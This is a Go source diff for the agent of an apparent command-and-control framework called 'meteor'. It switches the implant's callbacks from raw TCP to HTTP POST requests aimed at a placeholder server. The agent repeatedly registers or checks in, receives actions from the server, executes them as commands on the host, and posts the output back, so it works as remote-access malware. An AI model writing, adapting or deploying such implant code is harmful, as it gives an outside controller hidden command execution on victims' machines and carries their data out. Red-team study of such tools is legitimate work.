@@ -1,20 +1,19 @@
 package main
 
 import (
-	"bufio"
-	"encoding/base64"
+	"bytes"
 	"fmt"
-	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
+	agentUtils "github.com/degenerat3/meteor/meteor/agents/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
+	"io/ioutil"
 	"math/rand"
-	"net"
+	"net/http"
 	"os"
-	"strings"
 	"time"
 )
 
-// SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
+// SERVER is the IP/port of the web server to connect to (ex: `192.168.1.2:1234`)
 var SERVER = "$$SERVER$$"
 
 // INTERVAL is how long to sleep between callbacks
@@ -40,50 +39,31 @@ func main() {
 		os.Exit(0)
 	}
 	for {
-		var payload string
-		regstat := cUtils.CheckRegStatus(REGFILE)
+		var payload []byte
+		regstat := agentUtils.CheckRegStatus(REGFILE)
 		if DEBUG {
 			fmt.Printf("RegStat: %t\n", regstat)
 		}
 		if regstat {
-			payload = cUtils.GenCheckin(REGFILE, OBFTEXT)
+			payload = agentUtils.GenCheckinRaw(REGFILE, OBFTEXT)
 		} else {
-			payload = cUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
+			payload = agentUtils.GenRegisterRaw(INTERVAL, DELTA, REGFILE, OBFTEXT)
 		}
 		if DEBUG {
 			fmt.Printf("Payload: %s\n", payload)
 		}
-		conn, err := net.Dial("tcp", SERVER)
-		if err != nil {
-			if DEBUG {
-				fmt.Printf("Error connecting to server: %s\n", err.Error())
-			}
-			endCheck()
-			continue
-		}
+
 		if DEBUG {
-			fmt.Printf("Writing payload to conn...\n")
+			fmt.Printf("Sending payload over web req...\n")
 		}
-		fmt.Fprintf(conn, "%s\n", payload)
+		respData := sendWebReq(SERVER, payload)
+
 		if DEBUG {
-			fmt.Printf("Reading data from conn...\n")
+			fmt.Printf("Got response: %s\n", respData)
 		}
-		data, _ := bufio.NewReader(conn).ReadString('\n')
-		conn.Close()
-		data = strings.TrimSuffix(data, "\n")
-		if DEBUG {
-			fmt.Printf("Got response: %s\n", data)
-		}
-		decoded, err := base64.StdEncoding.DecodeString(data)
-		if DEBUG {
-			if err != nil {
-				fmt.Println("Error decoding response: " + err.Error())
-				endCheck()
-			}
-			fmt.Printf("Decoded: %s\n", decoded)
-		}
+
 		resp := &mcs.MCS{}
-		err = proto.Unmarshal(decoded, resp)
+		err := proto.Unmarshal(respData, resp)
 		if err != nil {
 			if DEBUG {
 				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
@@ -107,22 +87,14 @@ func main() {
 			}
 			mod := acn.GetMode()
 			args := acn.GetArgs()
-			acnOut := cUtils.ExecCommand(mod, args)
-			acnData := cUtils.GenAddResult(uid, acnOut)
-			conn, err = net.Dial("tcp", SERVER)
+			acnOut := agentUtils.ExecCommand(mod, args)
+			acnData := agentUtils.GenAddResultRaw(uid, acnOut)
 			if DEBUG {
-				fmt.Printf("Writing response data...\n")
+				fmt.Printf("Sending action result over request...\n")
 			}
-			fmt.Fprintf(conn, "%s\n", acnData)
-			if DEBUG {
-				fmt.Printf("Reading response ack...\n")
-			}
-			data, _ = bufio.NewReader(conn).ReadString('\n')
-			data = strings.TrimSuffix(data, "\n") // read the ack, even though we don't do anything with it rn
-			conn.Close()
+			sendWebReq(SERVER, acnData)
 		}
 		endCheck()
-		conn.Close()
 
 	}
 }
@@ -141,4 +113,21 @@ func endCheck() {
 		fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
 	}
 	time.Sleep(time.Duration(sleeptime) * time.Second)
+}
+
+func sendWebReq(server string, payload []byte) []byte {
+	url := "http://" + server + "/lf"
+	errDat := &mcs.MCS{
+		Status: 500,
+	}
+	errProto, _ := proto.Marshal(errDat)
+	resp, err := http.Post(url, "", bytes.NewBuffer(payload))
+	if err != nil {
+		return errProto
+	}
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return errProto
+	}
+	return data
 }
